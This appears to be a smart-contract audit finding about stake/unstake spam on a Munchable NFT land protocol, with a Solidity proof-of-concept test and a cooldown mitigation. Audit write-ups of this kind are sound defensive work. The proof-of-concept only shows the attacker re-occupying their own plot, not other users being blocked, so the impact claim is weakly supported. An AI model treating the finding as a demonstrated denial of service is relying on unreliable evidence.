# Vulnerability details

### [M-1] Plot Occupancy Manipulation

**Description:** 
An attacker who becomes a landowner can manipulate plot occupancy by repeatedly staking and unstaking their Munchable NFT. This malicious activity can block legitimate users from accessing plots, leading to significant disruptions and confusion in the system's state management.

**Impact:** 
Such manipulation can cause data inconsistencies and denial of service for legitimate users. These users may find themselves unable to interact with the plots they own or rent, thus severely impacting the overall functionality and user experience of the protocol.

**Proof of Code:**
```solidity
function testAttackerDisruptsPlotOccupancy() public {
    // Attacker stakes to become a landlord
    vm.startPrank(attacker);
    munchNFT.approve(address(landManager), 1);
    landManager.stakeMunchable(attacker, 1, 0);
    vm.stopPrank();

    // Verify the attacker is now a landlord
    (address mainAccount,) = landManager.getMainAccountRequireRegistered(attacker);
    assertEq(mainAccount, attacker, "Attacker did not become landlord");

    // Attacker repeatedly stakes and unstakes the Munchable NFT
    vm.startPrank(attacker);
    for (uint i = 0; i < 10; i++) {
        landManager.unstakeMunchable(1);
        landManager.stakeMunchable(attacker, 1, 0);
    }
    vm.stopPrank();

    // Verify the plot occupancy
    LandManager.Plot memory plot = landManager.getPlot(attacker, 1);
    assertEq(plot.occupied, true, "Plot not occupied by attacker");
    assertEq(plot.tokenId, 1, "Plot tokenId mismatch");
}
```

**Recommended Mitigation:** 
Introduce a cooldown period or restrict the frequency of staking and unstaking actions. 

```solidity
mapping(address => uint256) public lastActionTimestamp;
uint256 public cooldownPeriod = 1 hours;

function stakeMunchable(address user, uint256 tokenId, uint256 plotId) public {
    require(block.timestamp >= lastActionTimestamp[user] + cooldownPeriod, "Cooldown period not met");
    // Existing staking logic...
    lastActionTimestamp[user] = block.timestamp;
}

function unstakeMunchable(uint256 plotId) public {
    require(block.timestamp >= lastActionTimestamp[msg.sender] + cooldownPeriod, "Cooldown period not met");
    // Existing unstaking logic...
    lastActionTimestamp[msg.sender] = block.timestamp;
}

```

This measure will prevent the repetitive manipulation of plot occupancy within a short timeframe, ensuring fair access and interaction for all users.
